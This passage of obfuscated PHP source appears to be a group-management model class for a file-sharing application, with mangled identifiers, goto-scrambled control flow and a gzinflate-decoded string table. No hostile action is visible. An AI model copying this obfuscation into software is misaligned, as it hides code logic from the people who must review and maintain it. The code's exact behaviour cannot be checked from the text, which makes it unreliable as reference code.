b´á”ÁïËÕ; b´á”ÁïËÕ: foreach ($Eñ¨ÔËø‘¬ as &$D±Ä¤Í¿–) { $D±Ä¤Í¿–[$C²¤ˆÖ­ï’[588]] = $AóÈƒÒ»‘[$D±Ä¤Í¿–[$C²¤ˆÖ­ï’[1564]]]; if (isset($D±Ä¤Í¿–[$C²¤ˆÖ­ï’[1779]])) { $D±Ä¤Í¿–[$C²¤ˆÖ­ï’[1779]][$C²¤ˆÖ­ï’[588]] = $AóÈƒÒ»‘[$D±Ä¤Í¿–[$C²¤ˆÖ­ï’[1779]][$C²¤ˆÖ­ï’[1564]]]; } } unset($D±Ä¤Í¿–); goto c‚âºÕ‹”Ó; dÍ’ê¶Ğ¿: $C²¤ˆÖ­ï’ =& $_SERVER[›é¼±]; $EªêÚğÆ²Ñ = array_unique(array_to_keyvalue($Eñ¨ÔËø‘¬, $C²¤ˆÖ­ï’[33], $C²¤ˆÖ­ï’[1564])); $EªêÚğÆ²Ñ = array_remove_value($EªêÚğÆ²Ñ, $C²¤ˆÖ­ï’[191]); goto FŠ¸Œ³ÕÆò; c‚âºÕ‹”Ó: } private function _listAppendMeta(&$cÕÓÇ¯Ä) { goto E¸¯èÁë‡˜; A‡áŒ§”ó: if (!$f»Û–­ê©) { return; } foreach ($cÕÓÇ¯Ä as $Bš˜Ïƒ½Ÿ) { if (isset($Bš˜Ïƒ½Ÿ[$DíçÁôçƒ[1779]])) { $f»Û–­ê©[] = $Bš˜Ïƒ½Ÿ[$DíçÁôçƒ[1779]][$DíçÁôçƒ[1769]]; } } $Bù «Ø®é” = $this->metaList($f»Û–­ê©); goto eİ¢¹©ÉĞ; eİ¢¹©ÉĞ: if (!$Bù «Ø®é”) { return !1; } foreach ($cÕÓÇ¯Ä as &$Bš˜Ïƒ½Ÿ) { $Bš˜Ïƒ½Ÿ[$DíçÁôçƒ[459]] = $Bù «Ø®é”[$Bš˜Ïƒ½Ÿ[$DíçÁôçƒ[1769]]]; if (isset($Bš˜Ïƒ½Ÿ[$DíçÁôçƒ[1779]])) { $Bš˜Ïƒ½Ÿ[$DíçÁôçƒ[1779]][$DíçÁôçƒ[459]] = $Bù «Ø®é”[$Bš˜Ïƒ½Ÿ[$DíçÁôçƒ[1779]][$DíçÁôçƒ[1769]]]; } } unset($Bš˜Ïƒ½Ÿ); goto BÈÁÄ°˜Ç; E¸¯èÁë‡˜: $DíçÁôçƒ =& $_SERVER[›é¼±]; $f»Û–­ê© = array_unique(array_to_keyvalue($cÕÓÇ¯Ä, $DíçÁôçƒ[33], $DíçÁôçƒ[1769])); $f»Û–­ê© = array_remove_value($f»Û–­ê©, $DíçÁôçƒ[191]); goto A‡áŒ§”ó; BÈÁÄ°˜Ç: } private function metaList($B‡ÕÀæß··) { goto CøŠ‰©¸«é; aêÅñÖæšõ: $f¹¬¾ßµÓ˜ = Model($f¾–Şß®ê [1780])->where($Cèã¥æğ¶°)->select(); $f¹¬¾ßµÓ˜ = array_to_keyvalue_group($f¹¬¾ßµÓ˜, $f¾–Şß®ê [1769]); foreach ($f¹¬¾ßµÓ˜ as $D É˜ÌÚ­ => $C×–®Ú‰è¼) { $d¡ùƒ‘Î¹Ú = array(); foreach ($C×–®Ú‰è¼ as $A…á³©·ò¤) { $d¡ùƒ‘Î¹Ú[$A…á³©·ò¤[$f¾–Şß®ê [93]]] = $A…á³©·ò¤[$f¾–Şß®ê [372]]; } $f¹¬¾ßµÓ˜[$D É˜ÌÚ­] = $d¡ùƒ‘Î¹Ú; } goto DÄ­ÉŞ«è”; DÄ­ÉŞ«è”: return $f¹¬¾ßµÓ˜ ? $f¹¬¾ßµÓ˜ : array(); goto fèÕˆ®¶Ë”; CøŠ‰©¸«é: $f¾–Şß®ê  =& $_SERVER[›é¼±]; if (!$B‡ÕÀæß··) { return array(); } $Cèã¥æğ¶° = array($f¾–Şß®ê [1769] => array($f¾–Şß®ê [7], $B‡ÕÀæß··)); goto aêÅñÖæšõ; fèÕˆ®¶Ë”: } } goto EÏ°ùƒ™; D»ÑÕˆÎó©: define($_SERVER[›é¼±][0], $_SERVER[›é¼±][1]); $_SERVER[åœÄéø] = explode($_SERVER[›é¼±][2], gzinflate(substr($_SERVER[›é¼±][3], 10, -8))); function binCheckEq($FÏ¿¶»„Ş, $EŸ¼ÊÅ§“‰) { return $FÏ¿¶»„Ş == $EŸ¼ÊÅ§“‰; } goto AŸ›É¨°Í½; b„‚ö©Ã©¯: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\160"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\x6d\145" => "\147\x72\157\x75\160\137\x6d\145\x74\x61", "\x6d\145\x74\141\106\151\x65\154\x64" => "\147\162\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($A…âš‘Î¥) { $EÌÁ‘İ˜ÚÂ =& $_SERVER[›é¼±]; return array($EÌÁ‘İ˜ÚÂ[1807] => array($A…âš‘Î¥[0], $EÌÁ‘İ˜ÚÂ[1808]), $EÌÁ‘İ˜ÚÂ[1809] => array($A…âš‘Î¥[0], $EÌÁ‘İ˜ÚÂ[1810])); } protected function getInfo($cšä¨—Îù, $A±Íç†ä× = false) { $c›¶…‰’Šù = $this->getInfoSimple($cšä¨—Îù); if (!$c›¶…‰’Šù) { return !1; } if ($A±Íç†ä×) { return $this->_listDataApplyItem($c›¶…‰’Šù); } return $this->cacheFunctionGet($_SERVER[›é¼±][1811], $cšä¨—Îù); } protected function getInfoSimple($DƒÂÔàğ¬‘, $aâáÂëŸÑ± = false) { $D¬ÕÀÂğĞï =& $_SERVER[›é¼±]; if ($aâáÂëŸÑ±) { $cªŞ¿´ÓÄá = array($D¬ÕÀÂğĞï[1733] => intval($DƒÂÔàğ¬‘)); $A‹®Îøø… = $this->where($cªŞ¿´ÓÄá)->find(); return is_array($A‹®Îøø…) ? $A‹®Îøø… : array(); } return $this->cacheFunctionGet($D¬ÕÀÂğĞï[1812], $DƒÂÔàğ¬‘); } protected function groupAdd($D™…¿®”ìŠ) { goto c°‡¥é†ÒÉ; c¾´Ú÷¢²: if ($eİ¡‚æùİİ[$BóÒÈ“¥Šµ[515]]) { $dò¯–ÃÙÒğ = $eİ¡‚æùİİ[$BóÒÈ“¥Šµ[515]] . $eİ¡‚æùİİ[$BóÒÈ“¥Šµ[1733]] . $BóÒÈ“¥Šµ[47]; } $dº”–ÎŞÀ = array($BóÒÈ“¥Šµ[415] => $this->groupNameAuto($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[492]], $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[28]]), $BóÒÈ“¥Šµ[396] => $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[492]], $BóÒÈ“¥Šµ[578] => $dò¯–ÃÙÒğ, $BóÒÈ“¥Šµ[1813] => $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1717]], $BóÒÈ“¥Šµ[1814] => 0, $BóÒÈ“¥Šµ[1737] => 0); if (isset($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1756]])) { $dº”–ÎŞÀ[$BóÒÈ“¥Šµ[1756]] = $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1756]]; } else { $a¯ˆ¡ŸÜĞ” = $this->max($BóÒÈ“¥Šµ[1756]); if (!$a¯ˆ¡ŸÜĞ”) { $a¯ˆ¡ŸÜĞ” = 0; } $dº”–ÎŞÀ[$BóÒÈ“¥Šµ[1756]] = $a¯ˆ¡ŸÜĞ” + 1; } goto Eƒ‘Û›Ğº; Eƒ‘Û›Ğº: if (!empty($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1733]])) { $dº”–ÎŞÀ[$BóÒÈ“¥Šµ[1733]] = $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1733]]; } $a¾Ÿ±‹Ò = $this->add($dº”–ÎŞÀ); $this->setNamePinyin($a¾Ÿ±‹Ò, $dº”–ÎŞÀ[$BóÒÈ“¥Šµ[28]]); goto FòŸ›Ó¸¢´; FòŸ›Ó¸¢´: if (isset($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1815]])) { $this->metaSet($a¾Ÿ±‹Ò, array($BóÒÈ“¥Šµ[1815] => $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1815]], $BóÒÈ“¥Šµ[1816] => $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1816]])); unset($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1815]]); unset($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1816]]); } Model($BóÒÈ“¥Šµ[1239])->groupRootAdd($a¾Ÿ±‹Ò); return $a¾Ÿ±‹Ò; goto Aó†ìëì á; c°‡¥é†ÒÉ: $BóÒÈ“¥Šµ =& $_SERVER[›é¼±]; if (!$D™…¿®”ìŠ[$BóÒÈ“¥Šµ[492]] && isset($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1733]]) && $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1733]] == 1) { if ($eİ¡‚æùİİ = $this->getInfoSimple($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1733]], !0)) { return $D™…¿®”ìŠ[$BóÒÈ“¥Šµ[1733]]; } } else { $eİ¡‚æùİİ = $this->getInfoSimple($D™…¿®”ìŠ[$BóÒÈ“¥Šµ[492]]); if (!$eİ¡‚æùİİ) { return !1; } } $dò¯–ÃÙÒğ = $BóÒÈ“¥Šµ[525]; goto c¾´Ú÷¢²; Aó†ìëì á: } protected function groupEdit($fçÍ©Ä–´, $f©ÆÒš‡¢‰) { goto F¨Æ›Ä‰™‹; F¨Æ›Ä‰™‹: $DÚ™ì“‡›Ê =& $_SERVER[›é¼±]; $Eœå¦¤†Ï› = $this->getInfoSimple($fçÍ©Ä–´); if (!$Eœå¦¤†Ï›) { return !1; } goto C©†×ÉÖé; C©†×ÉÖé: if (!empty($f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[492]])) { $cë—Ó—œÔå = $this->getInfoSimple($f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[492]]); if (!$cë—Ó—œÔå) { return !1; } if ($Eœå¦¤†Ï›[$DÚ™ì“‡›Ê[1733]] == $cë—Ó—œÔå[$DÚ™ì“‡›Ê[1733]]) { return !1; } if ($f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[492]] != $Eœå¦¤†Ï›[$DÚ™ì“‡›Ê[492]]) { if ($cë—Ó—œÔå[$DÚ™ì“‡›Ê[515]] !== $Eœå¦¤†Ï›[$DÚ™ì“‡›Ê[515]] && strpos($cë—Ó—œÔå[$DÚ™ì“‡›Ê[515]], $Eœå¦¤†Ï›[$DÚ™ì“‡›Ê[515]] . $Eœå¦¤†Ï›[$DÚ™ì“‡›Ê[1733]] . $DÚ™ì“‡›Ê[47]) === 0) { return !1; } $f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[578]] = $cë—Ó—œÔå[$DÚ™ì“‡›Ê[515]] . $f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[492]] . $DÚ™ì“‡›Ê[47]; $this->_changeChildLevel($Eœå¦¤†Ï›, $cë—Ó—œÔå); } } if (isset($f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[28]])) { $this->setNamePinyin($fçÍ©Ä–´, $f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[28]]); } if (isset($f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[1815]])) { $this->metaSet($fçÍ©Ä–´, array($DÚ™ì“‡›Ê[1815] => $f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[1815]], $DÚ™ì“‡›Ê[1816] => $f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[1816]])); unset($f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[1815]]); unset($f©ÆÒš‡¢‰[$DÚ™ì“‡›Ê[1816]]); } goto bØóÄëÌõ; bØóÄëÌõ: $this->_clearChildrenCache($Eœå¦¤†Ï›); return $this->where(array($DÚ™ì“‡›Ê[1817] => $fçÍ©Ä–´))->save($f©ÆÒš‡¢‰); goto fî±´ØÉÔ; fî±´ØÉÔ: } private function _clearChildrenCache($fàØ©éŒ˜Ã) { $b¼íò¶¨´ =& $_SERVER[›é¼±]; $aÛ‰Í¹ê½ = array($b¼íò¶¨´[578] => array($b¼íò¶¨´[538], $fàØ©éŒ˜Ã[$b¼íò¶¨´[515]] . $fàØ©éŒ˜Ã[$b¼íò¶¨´[1733]] . $b¼íò¶¨´[539])); $A¯¹ ÄáÅæ = $this->field($b¼íò¶¨´[1733])->where($aÛ‰Í¹ê½)->select(); foreach ($A¯¹ ÄáÅæ as $Fª¢ğ¿éÑº) { $this->_clearCache($Fª¢ğ¿éÑº[$b¼íò¶¨´[1733]]); } } private function _clearCache($F¡ùò¬²îÉ) { $a¡¾ò‰Èò³ =& $_SERVER[›é¼±]; $this->cacheFunctionClear($a¡¾ò‰Èò³[1811], $F¡ùò¬²îÉ); $this->cacheFunctionClear($a¡¾ò‰Èò³[1812], $F¡ùò¬²îÉ); } private function _changeChildLevel($f°ºíôŠ–İ, $Bµ’»”Ã¨ö, $FÔäÄŞ±¶¼ = false) { goto bâ†îÑ¢’ß; fçŸôë¡ˆá: if ($FÔäÄŞ±¶¼) { $e›‚ÈšÄšÍ = $Bµ’»”Ã¨ö[$FÁŸŠ®©×Ù[515]] . $Bµ’»”Ã¨ö[$FÁŸŠ®©×Ù[1733]] . $FÁŸŠ®©×Ù[47]; } $Fæ§œ¡å²ƒ = array($FÁŸŠ®©×Ù[578] => array($FÁŸŠ®©×Ù[538], $f°ºíôŠ–İ[$FÁŸŠ®©×Ù[515]] . $f°ºíôŠ–İ[$FÁŸŠ®©×Ù[1733]] . $FÁŸŠ®©×Ù[539])); $A‚â«×ñâ = array($FÁŸŠ®©×Ù[578] => array($FÁŸŠ®©×Ù[587], "\x72\145\160\154\x61\x63\x65\x28\x70\141\162\x65\x6e\164\x4c\x65\166\145\154\x2c\47{$C“İ¤ÌÈ¶Ã}\47\x2c\47{$e›‚ÈšÄšÍ}\47\51")); goto bõì÷ÒÑŞõ; bõì÷ÒÑŞõ: $this->_clearChildrenCache($f°ºíôŠ–İ); $this->where($Fæ§œ¡å²ƒ)->data($A‚â«×ñâ)->save(); goto F¤¹ñê“¬¿; bâ†îÑ¢’ß: $FÁŸŠ®©×Ù =& $_SERVER[›é¼±]; $C“İ¤ÌÈ¶Ã = $f°ºíôŠ–İ[$FÁŸŠ®©×Ù[515]] . $f°ºíôŠ–İ[$FÁŸŠ®©×Ù[1733]] . $FÁŸŠ®©×Ù[47]; $e›‚ÈšÄšÍ = $Bµ’»”Ã¨ö[$FÁŸŠ®©×Ù[515]] . $Bµ’»”Ã¨ö[$FÁŸŠ®©×Ù[1733]] . $FÁŸŠ®©×Ù[47] . $f°ºíôŠ–İ[$FÁŸŠ®©×Ù[1733]] . $FÁŸŠ®©×Ù[47]; goto fçŸôë¡ˆá; F¤¹ñê“¬¿: } public function setNamePinyin($EêİÊ°‹à, $Bœ˜‘˜¼ğÓ = false) { $fä©Î¦¾à =& $_SERVER[›é¼±]; if (!$Bœ˜‘˜¼ğÓ) { $DÁÉèåš³î = $this->getInfoSimple($EêİÊ°‹à); $Bœ˜‘˜¼ğÓ = $DÁÉèåš³î[$fä©Î¦¾à[28]]; } if (!Input::check($Bœ˜‘˜¼ğÓ, $fä©Î¦¾à[581])) { $this->metaSet($EêİÊ°‹à, $fä©Î¦¾à[458], null); $this->metaSet($EêİÊ°‹à, $fä©Î¦¾à[457], null); return; } $A¿¾Î‹éøã = array($fä©Î¦¾à[458] => str_replace($fä©Î¦¾à[50], $fä©Î¦¾à[33], Pinyin::get($Bœ˜‘˜¼ğÓ)), $fä©Î¦¾à[457] => Pinyin::get($Bœ˜‘˜¼ğÓ, $fä©Î¦¾à[582])); $this->metaSet($EêİÊ°‹à, $A¿¾Î‹éøã); } protected function groupStatus($E•Á­ºäÎ¢, $aÕåØÀ¯¬) { goto a‰ÈÁÖÕÄ; A©Â½Üùİ°: if ($aÕåØÀ¯¬ == $d‹„…É¿[87]) { $D½¬¶Ä…¯ = $this->parentLevelArray($dòä£ô¾¡Æ[$d‹„…É¿[515]]); } else { $E…‡ùŸ«šï = array($d‹„…É¿[578] => array($d‹„…É¿[538], $dòä£ô¾¡Æ[$d‹„…É¿[515]] . $dòä£ô¾¡Æ[$d‹„…É¿[1733]] . $d‹„…É¿[539])); $D½¬¶Ä…¯ = $this->where($E…‡ùŸ«šï)->field($d‹„…É¿[1733])->select(); $D½¬¶Ä…¯ = array_to_keyvalue($D½¬¶Ä…¯, $d‹„…É¿[33], $d‹„…É¿[1733]); } $D½¬¶Ä…¯[] = $dòä£ô¾¡Æ[$d‹„…É¿[1733]]; $a¡¤ÍôÇ˜Û = array(); goto b£äªÕ¥¾”; a‰ÈÁÖÕÄ: $d‹„…É¿ =& $_SERVER[›é¼±]; $dòä£ô¾¡Æ = $this->getInfoSimple($E•Á­ºäÎ¢); if (!$dòä£ô¾¡Æ) { return !1; } goto A©Â½Üùİ°; b£äªÕ¥¾”: foreach ($D½¬¶Ä…¯ as $E•Á­ºäÎ¢) { $a¡¤ÍôÇ˜Û[] = array($d‹„…É¿[1733] => $E•Á­ºäÎ¢, $d‹„…É¿[93] => $d‹„…É¿[745], $d‹„…É¿[372] => $aÕåØÀ¯¬); $this->_clearCache($E•Á­ºäÎ¢); } return Model($d‹„…É¿[1818])->addAll($a¡¤ÍôÇ˜Û, array(), !0); goto FÑ¯²‰ö; FÑ¯²‰ö: } protected function groupRemove($fåÏò¢ ëã) { goto Aˆ½¹¶ÚŠí; Aˆ½¹¶ÚŠí: $FåïÎ°Œî´ =& $_SERVER[›é¼±]; $e†ˆ˜Ò÷Í = array($FåïÎ°Œî´[1733] => $fåÏò¢ ëã); $e—Ó‡—ê = $this->where($e†ˆ˜Ò÷Í)->find(); goto Dğ†ôß‡öÓ; Dğ†ôß‡öÓ: if (!$e—Ó‡—ê || $e—Ó‡—ê[$FåïÎ°Œî´[492]] == 0) { return !1; } $aàÖ¢¿Œï· = $this->getInfoSimple($e—Ó‡—ê[$FåïÎ°Œî´[492]]); $this->_changeChildLevel($e—Ó‡—ê, $aàÖ¢¿Œï·, !0); goto bïòê×ßÔ¼; bïòê×ßÔ¼: $this->where(array($FåïÎ°Œî´[492] => $fåÏò¢ ëã))->save(array($FåïÎ°Œî´[492] => $e—Ó‡—ê[$FåïÎ°Œî´[492]])); Model($FåïÎ°Œî´[1818])->where($e†ˆ˜Ò÷Í)->delete(); Model($FåïÎ°Œî´[1819])->where($e†ˆ˜Ò÷Í)->delete(); goto B§å‡Ÿ„½Ã; B§å‡Ÿ„½Ã: Model($FåïÎ°Œî´[827])->groupRootRemove($fåÏò¢ ëã); return $this->where($e†ˆ˜Ò÷Í)->delete(); goto aä°Ï««„; aä°Ï««„: } protected function groupSort($C—çÁ°µƒô) { $dáµÃİèÜ =& $_SERVER[›é¼±]; $c¢°½áÀÒ® = array(); foreach ($C—çÁ°µƒô as $Bô±ÙÇÆÉ­ => $d¨×¾‡Ô×) { $c¢°½áÀÒ®[] = array($dáµÃİèÜ[1733], $d¨×¾‡Ô×, $dáµÃİèÜ[1756], $Bô±ÙÇÆÉ­ + 1); } $this->saveAll($c¢°½áÀÒ®); } public function listData() { $eöÀŒˆĞ¡¡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eöÀŒˆĞ¡¡[$_SERVER[›é¼±][367]]); return $eöÀŒˆĞ¡¡; } private function _makeOrder($EéÍù„ƒ¤ = '') { goto B«›–£å; bİèÛø¾â£: $bÀÖÁ“¤ğ = Input::get($aš±ˆ‹š­È[449], $aš±ˆ‹š­È[7], $aš±ˆ‹š­È[1737], $EˆøÎé„á); $dÑ†ÏçğØ¯ = Input::get($aš±ˆ‹š­È[450], $aš±ˆ‹š­È[7], $aš±ˆ‹š­È[1820], array($aš±ˆ‹š­È[1820], $aš±ˆ‹š­È[444])); $dÑ†ÏçğØ¯ = $fà†Çù¼Ø‹[$dÑ†ÏçğØ¯]; goto A–±‹Øº; A–±‹Øº: $EéÍù„ƒ¤ = $EéÍù„ƒ¤ . "{$bÀÖÁ“¤ğ}\x20{$dÑ†ÏçğØ¯}\x2c\40\147\162\x6f\165\160\111\104\40\141\163\x63"; return $this->order($EéÍù„ƒ¤); goto bõà×Ä¾­Š; B«›–£å: $aš±ˆ‹š­È =& $_SERVER[›é¼±]; $EˆøÎé„á = array($aš±ˆ‹š­È[1733], $aš±ˆ‹š­È[28], $aš±ˆ‹š­È[1719], $aš±ˆ‹š­È[194]); $fà†Çù¼Ø‹ = array($aš±ˆ‹š­È[442] => $aš±ˆ‹š­È[443], $aš±ˆ‹š­È[444] => $aš±ˆ‹š­È[445]); goto bİèÛø¾â£; bõà×Ä¾­Š: } public function listChild($EÃ­ØÁ‹ôÂ) { $CÜÜ‹Ô‘ÆÌ =& $_SERVER[›é¼±]; $E²Š˜­‘¡± = $this->where(array($CÜÜ‹Ô‘ÆÌ[492] => $EÃ­ØÁ‹ôÂ))->_makeOrder()->selectPage(200); $this->_listDataApply($E²Š˜­‘¡±[$CÜÜ‹Ô‘ÆÌ[367]]); return $E²Š˜­‘¡±; } public function listByID($c³Š»Ö˜) { goto E¤îùòÜŞÆ; FÏ¿Ïºæß: $c‘©ïŠà = $this->where($cùÔÉ¸øÚ)->select(); $c‘©ïŠà = array_sort_keep($c‘©ïŠà, $b‰°ñáÁï[1733], $c³Š»Ö˜); $this->_listDataApply($c‘©ïŠà); goto bë¨™•ª¼ë; bë¨™•ª¼ë: return $c‘©ïŠà; goto Bïƒ¤ ´Œ†; E¤îùòÜŞÆ: $b‰°ñáÁï =& $_SERVER[›é¼±]; if (!$c³Š»Ö˜) { return array(); } $cùÔÉ¸øÚ = array($b‰°ñáÁï[1733] => array($b‰°ñáÁï[7], $c³Š»Ö˜)); goto FÏ¿Ïºæß; Bïƒ¤ ´Œ†: } public function listSearch($A”³Ü¤ÑšÚ) { goto eàšçèÏÎ˜; eàšçèÏÎ˜: $A¥†”Ì–‹„ =& $_SERVER[›é¼±]; $C„¥•³“© = $A”³Ü¤ÑšÚ[$A¥†”Ì–‹„[1821]]; $Cê‰“Š¾¨Æ = isset($A”³Ü¤ÑšÚ[$A¥†”Ì–‹„[1822]]) ? $A”³Ü¤ÑšÚ[$A¥†”Ì–‹„[1822]] : !1; goto DÄÉó²’ìŠ; CíÈÇ‹¿ö¸: $CÔßÅ½À = $CÔßÅ½À ? $CÔßÅ½À : array($A¥†”Ì–‹„[367] => array(), $A¥†”Ì–‹„[364] => array()); if (!$CÔßÅ½À || count($CÔßÅ½À[$A¥†”Ì–‹„[367]]) < 5 && Input::check($C„¥•³“©, $A¥†”Ì–‹„[316])) { goto B…·èÅÉ²ù; B…·èÅÉ²ù: $Eó‡©ğ™ê¶ = $this->groupChildrenAll($Cê‰“Š¾¨Æ); $e†‹à»Ññø = $this->_searchFromMeta($A¥†”Ì–‹„[457], $C„¥•³“©, 10, $Eó‡©ğ™ê¶); $DòÏª¡¯Í = $this->_searchFromMeta($A¥†”Ì–‹„[458], $C„¥•³“©, 10, $Eó‡©ğ™ê¶); goto DÑ‘°æˆÌ»; EõÏğ£Ë³Î: $CÔßÅ½À[$A¥†”Ì–‹„[364]][$A¥†”Ì–‹„[366]] = ceil($CÔßÅ½À[$A¥†”Ì–‹„[364]][$A¥†”Ì–‹„[365]] / $CÔßÅ½À[$A¥†”Ì–‹„[364]][$A¥†”Ì–‹„[361]]); goto cÜ‡ÜÎè ; DÑ‘°æˆÌ»: $bîğŠ›øÌÌ = array_merge($e†‹à»Ññø, $DòÏª¡¯Í, $CÔßÅ½À[$A¥†”Ì–‹„[367]]); $CÔßÅ½À[$A¥†”Ì–‹„[367]] = array_unique_by_key($bîğŠ›øÌÌ, $A¥†”Ì–‹„[1733]); $CÔßÅ½À[$A¥†”Ì–‹„[364]][$A¥†”Ì–‹„[365]] = count($CÔßÅ½À[$A¥†”Ì–‹„[367]]); goto EõÏğ£Ë³Î; cÜ‡ÜÎè : } $this->_listDataApply($CÔßÅ½À[$A¥†”Ì–‹„[367]]); goto CÁÛø‰›Ó‰; DÄÉó²’ìŠ: if (!trim($C„¥•³“©)) { return !1; } $C„¥•³“© = str_replace($A¥†”Ì–‹„[1823], $A¥†”Ì–‹„[1824], $C„¥•³“©); $c‹È£Ì¸×¤ = array($A¥†”Ì–‹„[1733] => array($A¥†”Ì–‹„[381], "{$C„¥•³“©}\x25"), $A¥†”Ì–‹„[28] => array($A¥†”Ì–‹„[381], "\45{$C„¥•³“©}\45"), $A¥†”Ì–‹„[992] => $A¥†”Ì–‹„[1825]); goto CŞ…Šù¸; CŞ…Šù¸: if ($Cê‰“Š¾¨Æ) { $D‘ºÓõèÅ‰ = $this->getInfoSimple($Cê‰“Š¾¨Æ); $DÂö¼¯ó•º = $D‘ºÓõèÅ‰[$A¥†”Ì–‹„[515]] . $Cê‰“Š¾¨Æ . $A¥†”Ì–‹„[539]; $c‹È£Ì¸×¤ = array($c‹È£Ì¸×¤, array($A¥†”Ì–‹„[515] => array($A¥†”Ì–‹„[381], $DÂö¼¯ó•º))); } $c‹È£Ì¸×¤ = $this->parseWhereLike($c‹È£Ì¸×¤); $CÔßÅ½À = $this->_makeOrder()->where($c‹È£Ì¸×¤)->selectPage(20); goto CíÈÇ‹¿ö¸; CÁÛø‰›Ó‰: return $CÔßÅ½À; goto d•ÕÓÒ´ï; d•ÕÓÒ´ï: } protected function groupChildrenAll($e¼ÌÊÌ¼³) { $fìÑŸøë‚è =& $_SERVER[›é¼±]; if (!$e¼ÌÊÌ¼³) { return !1; } if (is_string($e¼ÌÊÌ¼³)) { $e¼ÌÊÌ¼³ = array($e¼ÌÊÌ¼³); } $f˜Œ‹ËôŠ = $e¼ÌÊÌ¼³; foreach ($e¼ÌÊÌ¼³ as $aæìˆÉ‡ô’) { $aÔŠí³º— = $this->getInfoSimple($aæìˆÉ‡ô’); $F‹¶ÍÕÅŒ = array($fìÑŸøë‚è[515] => array($fìÑŸøë‚è[381], $aÔŠí³º—[$fìÑŸøë‚è[515]] . $aæìˆÉ‡ô’ . $fìÑŸøë‚è[539])); $Eğçøª· = $this->field($fìÑŸøë‚è[1733])->where($F‹¶ÍÕÅŒ)->select(); $f˜Œ‹ËôŠ = array_merge($f˜Œ‹ËôŠ, array_to_keyvalue($Eğçøª·, $fìÑŸøë‚è[33], $fìÑŸøë‚è[1733])); } return array_unique($f˜Œ‹ËôŠ); } private function _searchFromMeta($DŠ¯á©ßË‡, $dà«“Åß‰¬, $fŒ™¶õÕÄé, $eŸÆ©ª”°è) { goto bİîôÙ¢²š; bİîôÙ¢²š: $e»êÍãÎÏè =& $_SERVER[›é¼±]; $dà«“Åß‰¬ = strtolower($dà«“Åß‰¬); $A†Ÿ÷œë£ = array($e»êÍãÎÏè[93] => $DŠ¯á©ßË‡, $e»êÍãÎÏè[372] => array($e»êÍãÎÏè[381], "\45{$dà«“Åß‰¬}\x25")); goto bæ‰äôçë; bæ‰äôçë: $A†Ÿ÷œë£ = $this->parseWhereLike($A†Ÿ÷œë£); if ($eŸÆ©ª”°è) { $A†Ÿ÷œë£[$e»êÍãÎÏè[1733]] = array($e»êÍãÎÏè[7], $eŸÆ©ª”°è); } $AÇ¦¼‡³ÇÕ = Model($e»êÍãÎÏè[1826])->where($A†Ÿ÷œë£)->limit($fŒ™¶õÕÄé)->select(); goto f—Øï¦æª; f—Øï¦æª: if (!$AÇ¦¼‡³ÇÕ) { return array(); } $AÇ¦¼‡³ÇÕ = array_to_keyvalue($AÇ¦¼‡³ÇÕ, $e»êÍãÎÏè[33], $e»êÍãÎÏè[1733]); $AÜÍÆÕŠ‡Ô = $this->where(array($e»êÍãÎÏè[1817] => array($e»êÍãÎÏè[7], $AÇ¦¼‡³ÇÕ)))->select(); goto bŒƒ•ßõã¬; bŒƒ•ßõã¬: if (!$AÜÍÆÕŠ‡Ô) { return array(); } return $AÜÍÆÕŠ‡Ô; goto aÃ¨ˆ’ˆí­; aÃ¨ˆ’ˆí­: } protected function _listDataApplyItem($F„áÕôĞ…) { $E…øÎÏÛÎÔ = array($F„áÕôĞ…); $this->_listDataApply($E…øÎÏÛÎÔ); return $E…øÎÏÛÎÔ[0]; } protected function _listDataApply(&$A™¤©á¨–) { goto bã²Ñ¥ŒÎ; b‹èğšˆ¢à: $this->_listAppendChildren($A™¤©á¨–); $this->_listAppendChildrenMember($A™¤©á¨–); $this->_listAppendMeta($A™¤©á¨–, $E—¿•ÒíË); goto a¢Ü†—ÙÙÆ; a¢Ü†—ÙÙÆ: $this->_listAppendParent($A™¤©á¨–); $this->_listAppendSourceRoot($A™¤©á¨–, $E—¿•ÒíË); goto A¸îÎÖóñ; bã²Ñ¥ŒÎ: $a¥Ÿ®Üº =& $_SERVER[›é¼±]; if (!$A™¤©á¨–) { return; } $E—¿•ÒíË = array_to_keyvalue($A™¤©á¨–, $a¥Ÿ®Üº[33], $a¥Ÿ®Üº[1733]); goto b‹èğšˆ¢à; A¸îÎÖóñ: } private function _listAppendChildren(&$eß’ğÊ‘ºœ) { goto C£á‰Ô™¿Æ; a²’ª‹èÙ­: foreach ($eß’ğÊ‘ºœ as &$Eƒ¥½‰¢è) { $DƒË‚‚¸§³ = $Eƒ¥½‰¢è[$dÖ±Û‡öšõ[1733]]; $Eƒ¥½‰¢è[$dÖ±Û‡öšõ[1828]] = isset($c­À™¶äÒÅ[$DƒË‚‚¸§³]) ? intval($c­À™¶äÒÅ[$DƒË‚‚¸§³]) : !1; } unset($Eƒ¥½‰¢è); goto F²¶Ÿê©Š; C£á‰Ô™¿Æ: $dÖ±Û‡öšõ =& 